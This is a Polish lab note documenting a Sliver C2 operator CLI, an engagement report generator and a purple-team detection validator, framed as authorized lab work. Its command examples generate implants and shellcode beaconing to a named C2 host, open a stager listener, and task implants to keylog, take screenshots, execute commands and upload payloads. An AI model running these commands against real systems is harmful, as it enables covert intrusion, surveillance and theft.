---
title: "Sliver Ops — operator CLI + raporty + walidacja detekcji"
date: 2026-08-16
updated: 2026-08-16
tags: [sliver, c2, narzedzia, lab, purple-team]
status: active
---

# Sliver Ops — operator CLI + raporty + walidacja detekcji

Trzy narzędzia operatorskie (Python 3, bez zależności poza `sliver-py`):

| Narzędzie | Rola |
|-----------|------|
| `Narzedzia/sliver_ops.py` | pełny operator CLI — implanty (profile/generate/regenerate), stagers, tasking (screenshot/keylog/exec/…), download/upload, kill/rename, log do Obsidian |
| `Narzedzia/sliver_report.py` | generator raportu engagement — timeline, artefakty, co zostało na hostach (OPSEC), checklist sprzątania, wpis w `Daily/` |
| `Narzedzia/detection_validator.py` | purple-team walidator — replay technik przez Suricatę + matcher Sigma → tablica pokrycia technika↔detekcja |

Zakres: **wyłącznie autoryzowany lab (XMask)**. Operacje destrukcyjne wymagają `--yes`. Nie dumpujemy `credentials`/kluczy implantu.

## sliver_ops.py

```bash
# stan
sliver_ops.py version | sessions | beacons | jobs | profiles | builds | audit

# profile (jak notatki Backdoor_Go_easports — nazwany config implantu)
sliver_ops.py profile-save web_beacon --os windows --arch amd64 \
    --c2-https https://c2.maskencrypt.eu --beacon --interval 60 --jitter 10
sliver_ops.py generate --name lab01 --profile web_beacon --yes

# generate z flagami (bez profilu)
sliver_ops.py generate --name lab02 --os windows --arch amd64 \
    --c2-https https://c2.maskencrypt.eu --beacon --interval 60 --jitter 10 \
    --obfuscate --yes
sliver_ops.py generate --name lab03 --os linux --arch amd64 \
    --c2-mtls c2.maskencrypt.eu --yes
sliver_ops.py generate --name sc01 --format shellcode --c2-https ... --yes

# stager listener (profil musi być shellcode)
sliver_ops.py stager-start --profile sc01 --protocol tcp --host 0.0.0.0 --port 8443 --yes

# tasking (sesja albo beacon — id z prefixem albo nazwa)
sliver_ops.py task <ID> screenshot
sliver_ops.py task <ID> keylog --duration 20
sliver_ops.py task <ID> exec --cmd whoami
sliver_ops.py task <ID> download C:/Users/Administrator/Desktop/x.txt
sliver_ops.py task <ID> upload ./payload.exe C:/tmp/p.exe
sliver_ops.py task <ID> ls C:/ | ps | ping | netstat | ifconfig

# koniec sesji / higiena
sliver_ops.py kill <ID> --yes
sliver_ops.py rename <ID> nowa_nazwa
sliver_ops.py jobs-kill 3 --yes
sliver_ops.py profile-delete web_beacon --yes | build-delete DUE_WASP --yes
```

Każda operacja trafia do:
- `Logs/sliver_ops/ops.jsonl` — log maszynowy (źródło timeline'u w raporcie),
- `Daily/YYYY-MM-DD.md` — wpis dzienny (higiena: bez haseł/tokenów).

Artefakty (implanty, screenshoty, keylogi, downloady) lądują w `Logs/sliver_ops/artifacts/`.

### Uwaga techniczna: sliver-py vs Sliver v1.7.3

`sliver-py` 0.0.19 ma protobufy **starego** Slivera (v1.5): w `ImplantConfig` pola
są przesunięte (GOOS 5→7, IsBeacon 2→4, doszedł `ImplantBuilds`=2), a
`GenerateReq.Name`=2 nie istnieje. Dlatego `sliver_ops.py` koduje wire-format
ręcznie (sekcja *Sliver v1.7.1 wire codec* w pliku, wg `client.proto` v1.7.1).
Objaw bez tego: serwer widzi `GOOS=opstest01` i puste C2.

## sliver_report.py

```bash
sliver_report.py                                  # raport z dziś
sliver_report.py --engagement kerberoast-01       # nazwa engagementu
sliver_report.py --offline                        # bez gRPC (db+audit+ops)
sliver_report.py --json                           # surowe dane
```

Źródła: sliver-py (live) + `/root/.sliver/sliver.db` (SQLite, read-only) +
`/root/.sliver/logs/audit.json` (akcje operatora) + `ops.jsonl` (akcje
sliver_ops). Wynik: `raports/YYYY-MM-DD_<name>_engagement.md` — timeline,
artefakty, co zostało na hostach (implant/persistencja/pliki), checklist
sprzątania z gotowymi komendami, wpis w `Daily/`.

## detection_validator.py

```bash
detection_validator.py --rules all --technique all    # pełne pokrycie
detection_validator.py --technique kerberoasting      # jedna technika
detection_validator.py --pcap /sciezka/capture.pcap   # replay własnego pcap
detection_validator.py --rules clayrat --technique clayrat-beacon
```

- **Suricata** (offline, `suricata -r`): syntetyczne pcapy technik —
  ClayRat beacon HTTP/WS/DNS (reguły `clayrat_c2.rules`) i AD:
  kerberoasting, AS-REP roast, password spray, SMB/LDAP enum, DCSync
  (`local.rules`). Sprawdza, które SID-y odpaliły.
- **Sigma** (5 reguł AD lab): syntetyczne zdarzenia Windows Security przez
  uproszczony matcher (selection/filter + `count() by` + `timeframe`).
- Wynik: tablica pokrycia technika↔detekcja → `raports/YYYY-MM-DD_detection_coverage.md`
  + `Logs/sliver_ops/coverage_<date>.csv` + wpis w `Daily/`.

### Znaleziony bug (16.08)

Reguła `clayrat_c2.rules` sid 9000802 (`http.host` + `nocase`) **nigdy nie
triggerowała** na Suricacie 7.0.10 — bufor hosta jest normalizowany do małych
liter i kombinacja z `nocase` łamie dopasowanie (Suricata sam ostrzega, że
`nocase` jest zbędne). Po usunięciu `nocase` (rev:2) replay: PARTIAL → PASS.
Walidator pokazał lukę — regułę poprawiono i zweryfikowano.

## Powiązane

- [[Sliver_C2]] · [[Infrastruktura_C2]] · [[sessions]] · [[Automatyzacja]]
- [[Detekcja]] · [[ClayRat_Android_RAT]] · [[Faza2_Windows_AD]] · [[Playbook_AD]]
